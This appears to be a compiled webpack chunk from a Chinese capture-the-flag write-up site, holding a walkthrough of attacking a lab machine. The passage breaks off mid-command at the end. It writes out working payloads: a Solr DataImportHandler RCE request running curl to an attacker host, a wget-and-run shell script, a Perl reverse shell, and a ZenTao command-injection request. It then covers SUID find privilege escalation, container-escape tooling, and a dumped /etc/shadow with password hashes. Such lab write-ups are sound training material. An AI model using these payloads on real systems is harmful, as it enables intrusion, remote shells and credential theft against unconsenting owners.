"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9415],{29947:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>i,default:()=>p,frontMatter:()=>c,metadata:()=>a,toc:()=>l});const a=JSON.parse('{"id":"Independent-Environment/NSS/attack","title":"\u653b\u51fb\u9776\u673a","description":"\u4fe1\u606f\u641c\u96c6","source":"@site/docs/Independent-Environment/2024-NSS/attack.md","sourceDirName":"Independent-Environment/2024-NSS","slug":"/Independent-Environment/NSS/attack","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/NSS/attack","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/2024-NSS/attack.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"2024-NSS","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/NSS/"},"next":{"title":"\u9632\u5fa1\u9776\u673a","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/NSS/defence"}}');var r=t(74848),s=t(28453);const c={},i="\u653b\u51fb\u9776\u673a",o={},l=[{value:"\u4fe1\u606f\u641c\u96c6",id:"\u4fe1\u606f\u641c\u96c6",level:2},{value:"Port 8983 Solr",id:"port-8983-solr",level:2},{value:"FLAG - USER",id:"flag---user",level:2},{value:"\u5bb9\u5668\u4fe1\u606f\u6536\u96c6",id:"\u5bb9\u5668\u4fe1\u606f\u6536\u96c6",level:2},{value:"Port 80 \u7985\u9053",id:"port-80-\u7985\u9053",level:2},{value:"\u5bb9\u5668\u4fe1\u606f\u6536\u96c6",id:"\u5bb9\u5668\u4fe1\u606f\u6536\u96c6-1",level:2},{value:"\u5bb9\u5668\u9003\u9038\u5206\u6790",id:"\u5bb9\u5668\u9003\u9038\u5206\u6790",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"\u653b\u51fb\u9776\u673a",children:"\u653b\u51fb\u9776\u673a"})}),"\n",(0,r.jsx)(n.h2,{id:"\u4fe1\u606f\u641c\u96c6",children:"\u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",metastring:'title="sudo ./tools/fscan-1.8.4/fscan -h 192.168.200.134"',children:"start infoscan\n192.168.200.134:80 open\n192.168.200.134:22 open\n192.168.200.134:8983 open\n[*] alive ports len is: 3\nstart vulscan\n[*] WebTitle http://192.168.200.134:8983 code:302 len:0      title:None \u8df3\u8f6c url: http://192.168.200.134:8983/solr/\n[*] WebTitle http://192.168.200.134:8983/solr/ code:200 len:13138  title:Solr Admin\n[*] WebTitle http://192.168.200.134    code:200 len:124    title:None\n[+] InfoScan http://192.168.200.134    [\u7985\u9053]\n[+] PocScan http://192.168.200.134:8983 poc-yaml-solr-cve-2019-0193\n"})}),"\n",(0,r.jsx)(n.h2,{id:"port-8983-solr",children:"Port 8983 Solr"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(56478).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u83b7\u53d6 Solr Core \u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-json",metastring:'title="http://192.168.200.134:8983/solr/admin/cores"',children:'{\n  "responseHeader": {\n    "status": 0,\n    "QTime": 1\n  },\n  "initFailures": {},\n  "status": {\n    "demo": {\n      "name": "demo",\n      "instanceDir": "/opt/solr/server/solr/demo",\n      "dataDir": "/opt/solr/server/solr/demo/data/",\n      "config": "solrconfig.xml",\n      "schema": "managed-schema",\n      "startTime": "2025-03-15T00:22:56.656Z",\n      "uptime": 401141,\n      "index": {\n        "numDocs": 46,\n        "maxDoc": 46,\n        "deletedDocs": 0,\n        "indexHeapUsageBytes": -1,\n        "version": 6,\n        "segmentCount": 1,\n        "current": false,\n        "hasDeletions": false,\n        "directory": "org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(MMapDirectory@/opt/solr/server/solr/demo/data/index lockFactory=org.apache.lucene.store.NativeFSLockFactory@18c59b55; maxCacheMB=48.0 maxMergeSizeMB=4.0)",\n        "segmentsFile": "segments_2",\n        "segmentsFileSizeInBytes": -1,\n        "userData": {\n          "commitCommandVer": "1825672391880081408",\n          "commitTimeMSec": "1741096870309"\n        },\n        "lastModified": "2025-03-04T14:01:10.309Z",\n        "sizeInBytes": 34167,\n        "size": "33.37 KB"\n      }\n    }\n  }\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u83b7\u5f97 ",(0,r.jsx)(n.code,{children:'"name": "demo"'})," \u4fe1\u606f\u4e4b\u540e\uff0c\u6839\u636e\u6240\u5f97\u5230\u7684 Solr Core \u4fe1\u606f\uff0c\u6784\u9020\u653b\u51fb\u6570\u636e\u5305"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u653b\u51fb\u673a\u4e0a ",(0,r.jsx)(n.code,{children:"http://192.168.200.128/solr.xml"})," \u5730\u5740\uff0c\u6258\u7ba1\u4e00\u4efd\u57fa\u7840\u7684 Solr \u6570\u636e\u6e90"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<RDF>\n<item/>\n</RDF>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u540e\u53d1\u5305"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:'POST /solr/demo/dataimport HTTP/1.1\nHost: 192.168.200.134:8983\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 770\n\ncommand=full-import&verbose=false&clean=false&commit=false&debug=true&core=demo&name=dataimport&dataConfig=<dataConfig> <dataSource type="URLDataSource"/> <script><![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("curl 192.168.200.128:9999").getInputStream())); var result = []; while(true) { var oneline = bufReader.readLine(); result.push( oneline ); if(!oneline) break; } row.put("title",result.join("\\n\\r")); return row; } ]]><\/script> <document> <entity name="entity1" url="http://192.168.200.128/solr.xml" processor="XPathEntityProcessor" forEach="/RDF/item" transformer="script:poc"> <field column="title" xpath="/RDF/item/title" /> </entity> </document> </dataConfig>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6210\u529f\u6536\u5230\u8bf7\u6c42"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(39090).A+"",width:"2560",height:"1540"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u6784\u9020\u53cd\u8fde"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:'POST /solr/demo/dataimport HTTP/1.1\nHost: 192.168.200.134:8983\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 770\n\ncommand=full-import&verbose=false&clean=false&commit=false&debug=true&core=demo&name=dataimport&dataConfig=<dataConfig> <dataSource type="URLDataSource"/> <script><![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("curl 192.168.200.128:9999").getInputStream())); var result = []; while(true) { var oneline = bufReader.readLine(); result.push( oneline ); if(!oneline) break; } row.put("title",result.join("\\n\\r")); return row; } ]]><\/script> <document> <entity name="entity1" url="http://192.168.200.128/solr.xml" processor="XPathEntityProcessor" forEach="/RDF/item" transformer="script:poc"> <field column="title" xpath="/RDF/item/title" /> </entity> </document> </dataConfig>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u5b9e\u73b0\u53cd\u8fde"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"wget 192.168.200.128/shell.sh\nchmod +x shell.sh\nsh ./shell.sh\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6210\u529f\u6536\u5230\u53cd\u5f39 shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ nc -lvnp 9999\nlistening on [any] 9999 ...\nconnect to [192.168.200.128] from (UNKNOWN) [192.168.200.134] 42364\nroot@7c589689c593:/opt/solr/server# whoami\nroot\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6216\u8005\u4e5f\u53ef\u4ee5\u9ad8\u7ea7\u4e00\u70b9\uff0c\u76f4\u63a5\u7528 ",(0,r.jsx)(n.code,{children:"pwncat"})," \u5904\u7406\u53cd\u8fde shell"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ pwncat-cs -lp 9999\n[08:45:06] Welcome to pwncat \ud83d\udc08!\n[08:45:13] received connection from 192.168.200.134:51926\n[08:45:13] 192.168.200.134:51926: registered new host w/ db\n(local) pwncat$ back\n(remote) root@7c589689c593:/opt/solr/server# whoami\nroot\n"})}),"\n",(0,r.jsx)(n.h2,{id:"flag---user",children:"FLAG - USER"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",metastring:'title="/home/user.txt"',children:"zentao:18.0.beta1\n\nusername:Nss-admin\npassword:Ax2Xwz1@x*Xs1I\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u5bb9\u5668\u4fe1\u606f\u6536\u96c6",children:"\u5bb9\u5668\u4fe1\u606f\u6536\u96c6"}),"\n",(0,r.jsxs)(n.p,{children:["\u4e0a\u4f20\u4e24\u4e2a\u5de5\u5177 ",(0,r.jsx)(n.code,{children:"CDK"})," \u548c ",(0,r.jsx)(n.code,{children:"linpeas"})," \u8fd0\u884c\uff0c\u5f97\u5230\u81ea\u52a8\u5316\u68c0\u6d4b\u7ed3\u679c"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",metastring:'title="linpeas"',children:"                                   \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n                                   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container related tools present (if any):\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Am I Containered?\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container details\n\u2550\u2563 Is this a container? ........... docker\n\u2550\u2563 Any running containers? ........ No\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Docker Container details\n\u2550\u2563 Am I inside Docker group ....... No\n\u2550\u2563 Looking and enumerating Docker Sockets (if any):\n\u2550\u2563 Docker version ................. Not Found\n\u2550\u2563 Vulnerable to CVE-2019-5736 .... Not Found\n\u2550\u2563 Vulnerable to CVE-2019-13139 ... Not Found\n\u2550\u2563 Rootless Docker? ............... No\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container & breakout enumeration\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout\n\u2550\u2563 Container ID ................... 7c589689c593\n\u2550\u2563 Container Full ID .............. 7c589689c59359d9d102a4a86ff07bab62b7ed6462756bc299fe37e570550c56\n\u2550\u2563 Seccomp enabled? ............... enabled\n\u2550\u2563 AppArmor profile? .............. docker-default (enforce)\n\u2550\u2563 User proc namespace? ........... enabled         0          0 4294967295\n\u2550\u2563 Vulnerable to CVE-2019-5021 .... No\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u7528\u6237\u76ee\u5f55\u4e0b\uff0c\u5f97\u5230\u7985\u9053\u7684\u51ed\u636e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/user.txt"',children:"zentao:18.0.beta1\n\nusername:Nss-admin\npassword:Ax2Xwz1@x*Xs1I\n"})}),"\n",(0,r.jsx)(n.h2,{id:"port-80-\u7985\u9053",children:"Port 80 \u7985\u9053"}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u5728 Solr \u5f97\u5230\u7684\u51ed\u636e\uff0c\u767b\u5f55\u7985\u9053"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(29970).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5f97\u5230\u7684\u7985\u9053\u7248\u672c\u662f ",(0,r.jsx)(n.code,{children:"Opensource 18.0 beta1"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u53c2\u8003 ",(0,r.jsx)(n.a,{href:"https://www.secpulse.com/archives/195828.html",children:"\u7985\u9053\u7cfb\u7edf\u6743\u9650\u7ed5\u8fc7\u4e0e\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e - SecPulse.COM | \u5b89\u5168\u8109\u640f"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"POST /repo-create-1.html HTTP/1.1\nHost: 192.168.200.134\nX-Requested-With: XMLHttpRequest\nAccept-Language: zh-CN,zh;q=0.9\nAccept: application/json, text/javascript, */*; q=0.01\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\nReferer: http://192.168.200.134/my.html\nAccept-Encoding: gzip, deflate, br\nCookie: lang=zh-cn; device=desktop; theme=default; zentaosid=9rk21290991v9165crc79sb813;\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 109\n\nproduct%5B%5D=1&SCM=Gitlab&name=123&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f97\u5230\u8fd4\u56de"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(74601).A+"",width:"2378",height:"1339"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:'{\n    "result": "success",\n    "message": "\u4fdd\u5b58\u6210\u529f",\n    "locate": "/repo-showSyncCommit-3-1.html#app=devops"\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u7136\u540e\u5c1d\u8bd5\u6267\u884c ",(0,r.jsx)(n.code,{children:"id"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"POST /repo-edit-10000-10000.html HTTP/1.1\nHost: 192.168.200.134\nX-Requested-With: XMLHttpRequest\nAccept-Language: zh-CN,zh;q=0.9\nAccept: application/json, text/javascript, */*; q=0.01\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\nReferer: http://192.168.200.134/my.html\nAccept-Encoding: gzip, deflate, br\nCookie: lang=zh-cn; device=desktop; theme=default; zentaosid=9rk21290991v9165crc79sb813;\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 26\n\nSCM=Subversion&client=`id`\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f97\u5230\u8fd4\u56de"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:'{\n    "result": "fail",\n    "message": {\n        "client": "\u5ba2\u6237\u7aef\u9519\u8bef\uff01<br /> \u6267\u884c\u547d\u4ee4\uff1a`id` --version --quiet 2>&1<br />\\n \u9519\u8bef\u7ed3\u679c (127)\uff1a sh: 1: uid=33(www-data): not found<br />\\n"\n    }\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u786e\u8ba4\u53ef\u4ee5\u547d\u4ee4\u6267\u884c\uff0c\u5c1d\u8bd5\u53cd\u5f39 shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",metastring:'title="shell.sh"',children:'perl -e \'use Socket;$i="192.168.200.128";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\'\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs -lp 9999\n[13:21:31] Welcome to pwncat \ud83d\udc08!\n[13:26:32] received connection from 192.168.200.134:41340\n[13:26:33] 192.168.200.134:41340: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@873c2ec0dbeb:/www/zentaopms/module/repo$ whoami\nwww-data\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u5bb9\u5668\u4fe1\u606f\u6536\u96c6-1",children:"\u5bb9\u5668\u4fe1\u606f\u6536\u96c6"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u641c\u5bfb suid \u7279\u6743\u6587\u4ef6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/bin/su\n/bin/mount\n/bin/umount\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/find\n......\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c1d\u8bd5\u5229\u7528 ",(0,r.jsx)(n.code,{children:"find"})," \u5b9e\u73b0\u63d0\u6743\u5230 root"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@873c2ec0dbeb:/tmp$ find . -exec /bin/bash -p \\; -quit\n(remote) root@873c2ec0dbeb:/tmp$ whoami\nroot\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u641c\u96c6\u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",metastring:'title="linpeass"',children:"                              \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Network Information \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n                              \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Hostname, hosts and DNS\n873c2ec0dbeb\n127.0.0.1       localhost\n::1     localhost ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n172.17.0.2      873c2ec0dbeb\n\nnameserver 192.168.200.2\nsearch localdomain\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",metastring:'title="cdk"',children:"(remote) root@873c2ec0dbeb:/tmp# ./cdk_linux_amd64 auto-escape ls\n2025/03/15 13:57:45 Caution: Flag auto-escape is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to `./cdk eva --full` and `./cdk run`.\n\n[Auto Escape - Privileged Container]\n2025/03/15 13:57:45 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):\n        CapInh: 0000000000000000\n        CapPrm: 000001ffffffffff\n        CapEff: 000001ffffffffff\n        CapBnd: 000001ffffffffff\n        CapAmb: 0000000000000000\n        Cap decode: 0x000001ffffffffff = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_DAC_READ_SEARCH,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_LINUX_IMMUTABLE,CAP_NET_BIND_SERVICE,CAP_NET_BROADCAST,CAP_NET_ADMIN,CAP_NET_RAW,CAP_IPC_LOCK,CAP_IPC_OWNER,CAP_SYS_MODULE,CAP_SYS_RAWIO,CAP_SYS_CHROOT,CAP_SYS_PTRACE,CAP_SYS_PACCT,CAP_SYS_ADMIN,CAP_SYS_BOOT,CAP_SYS_NICE,CAP_SYS_RESOURCE,CAP_SYS_TIME,CAP_SYS_TTY_CONFIG,CAP_MKNOD,CAP_LEASE,CAP_AUDIT_WRITE,CAP_AUDIT_CONTROL,CAP_SETFCAP,CAP_MAC_OVERRIDE,CAP_MAC_ADMIN,CAP_SYSLOG,CAP_WAKE_ALARM,CAP_BLOCK_SUSPEND,CAP_AUDIT_READ,CAP_PERFMON,CAP_BPF,CAP_CHECKPOINT_RESTORE\n        Added capability list: CAP_DAC_READ_SEARCH,CAP_LINUX_IMMUTABLE,CAP_NET_BROADCAST,CAP_NET_ADMIN,CAP_IPC_LOCK,CAP_IPC_OWNER,CAP_SYS_MODULE,CAP_SYS_RAWIO,CAP_SYS_PTRACE,CAP_SYS_PACCT,CAP_SYS_ADMIN,CAP_SYS_BOOT,CAP_SYS_NICE,CAP_SYS_RESOURCE,CAP_SYS_TIME,CAP_SYS_TTY_CONFIG,CAP_LEASE,CAP_AUDIT_CONTROL,CAP_MAC_OVERRIDE,CAP_MAC_ADMIN,CAP_SYSLOG,CAP_WAKE_ALARM,CAP_BLOCK_SUSPEND,CAP_AUDIT_READ,CAP_PERFMON,CAP_BPF,CAP_CHECKPOINT_RESTORE\n[*] Maybe you can exploit the Capabilities below:\n[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.\n[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/.\nCritical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'.\n2025/03/15 13:57:45 not privileged container.\n\n[Auto Escape - Shared Net Namespace]\n2025/03/15 13:57:45 Cannot find vulnerable containerd-shim socket.\n2025/03/15 13:57:45 exploit failed.\n\n[Auto Escape - docker.sock]\n2025/03/15 13:57:45 err found while stat docker.sock path.:\nstat /var/run/docker.sock: no such file or directory\n2025/03/15 13:57:45 exploit failed\n\n[Auto Escape - K8s API Server]\n2025/03/15 13:57:45 checking if api-server allows system:anonymous request.\nerr found while searching local K8s apiserver addr.:\nerr: cannot find kubernetes api host in ENV\n        api-server forbids anonymous request.\n        response:\nload K8s service account token error.:\nopen /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or directory\n2025/03/15 13:57:45 exploit failed\n2025/03/15 13:57:45 all exploits are finished, auto exploit failed.\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6839\u636e\u8f93\u51fa\uff0c\u5c1d\u8bd5\u4f7f\u7528 ",(0,r.jsx)(n.code,{children:"cap-dac-read-search"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",metastring:'title="./cdk_linux_amd64 run cap-dac-read-search"',children:"(remote) root@873c2ec0dbeb:/tmp# ./cdk_linux_amd64 run cap-dac-read-search\nRunning with target: /etc/shadow, ref: /etc/hostname\nroot:$6$yI61A01eNCul1WWm$qNFS.GCNGvnPNf09b2iZArHiXW5jB9d/Z4bh5hXBFotzQmcmUw6rVjJ6dxJZLU8y9EystxPsuKlld2Grk8Gc2/:20151:0:99999:7:::\ndaemon:*:18375:0:99999:7:::\nbin:*:18375:0:99999:7:::\nsys:*:18375:0:99999:7:::\nsync:*:18375:0:99999:7:::\ngames:*:18375:0:99999:7:::\nman:*:18375:0:99999:7:::\nlp:*:18375:0:99999:7:::\nmail:*:18375:0:99999:7:::\nnews:*:18375:0:99999:7:::\nuucp:*:18375:0:99999:7:::\nproxy:*:18375:0:99999:7:::\nwww-data:*:18375:0:99999:7:::\nbackup:*:18375:0:99999:7:::\nlist:*:18375:0:99999:7:::\nirc:*:18375:0:99999:7:::\ngnats:*:18375:0:99999:7:::\nnobody:*:18375:0:99999:7:::\nsystemd-network:*:18375:0:99999:7:::\nsystemd-resolve:*:18375:0:99999:7:::\nsystemd-timesync:*:18375:0:99999:7:::\nmessagebus:*:18375:0:99999:7:::\nsyslog:*:18375:0:99999:7:::\n_apt:*:18375:0:99999:7:::\ntss:*:18375:0:99999:7:::\nuuidd:*:18375:0:99999:7:::\ntcpdump:*:18375:0:99999:7:::\navahi-autoipd:*:18375:0:99999:7:::\nusbmux:*:18375:0:99999:7:::\nrtkit:*:18375:0:99999:7:::\ndnsmasq:*:18375:0:99999:7:::\ncups-pk-helper:*:18375:0:99999:7:::\nspeech-dispatcher:!:18375:0:99999:7:::\navahi:*:18375:0:99999:7:::\nkernoops:*:18375:0:99999:7:::\nsaned:*:18375:0:99999:7:::\nnm-openvpn:*:18375:0:99999:7:::\nhplip:*:18375:0:99999:7:::\nwhoopsie:*:18375:0:99999:7:::\ncolord:*:18375:0:99999:7:::\ngeoclue:*:18375:0:99999:7:::\npulse:*:18375:0:99999:7:::\ngnome-initial-setup:*:18375:0:99999:7:::\ngdm:*:18375:0:99999:7:::\nqwe:$6$PHFUFXpCzu7EsuT9$vTXRl66ngDfaki6e2S2MCeO5J2YpDsO6AeubOshT.Hdvrf49lRsVhyejaPMDmDhUFdezeX1cIH5cQATtHY0p9.:20151:0:99999:7:::\nsystemd-coredump:!!:20101::::::\nsshd:*:20151:0:99999:7:::\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u5bb9\u5668\u9003\u9038\u5206\u6790",children:"\u5bb9\u5668\u9003\u9038\u5206\u6790"}),"\n",(0,r.jsxs)(n.p,{children:["\u7ed3\u5408 ",(0,r.jsx)(n.code,{children:"CAP_DAC_READ_SEARCH"})," \u6743\u9650\u88ab\u542f\u7528\uff0c\u5c1d\u8bd5\u8fdb\u884c\u5206\u6790"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) root@873c2ec0dbeb:/tmp# ./cdk_linux_amd64 run cap-dac-read-search\nRunning with target: /etc/shadow, ref: /etc/hostname\nroot:$6$yI61A01eNCul1WWm$qNFS.GCNGvnPNf09b2iZArHiXW5jB9d/Z4bh5hXBFotzQmcmUw6rVjJ6dxJZLU8y9EystxPsuKlld2Grk8Gc2/:20151:0:99999:7:::\n......\nqwe:$6$PHFUFXpCzu7EsuT9$vTXRl66ngDfaki6e2S2MCeO5J2YpDsO6AeubOshT.Hdvrf49lRsVhyejaPMDmDhUFdezeX1cIH5cQATtHY0p9.:20151:0:99999:7:::\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u540c\u65f6\u53d1\u73b0"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) root@873c2ec0dbeb:/data/etc# cat 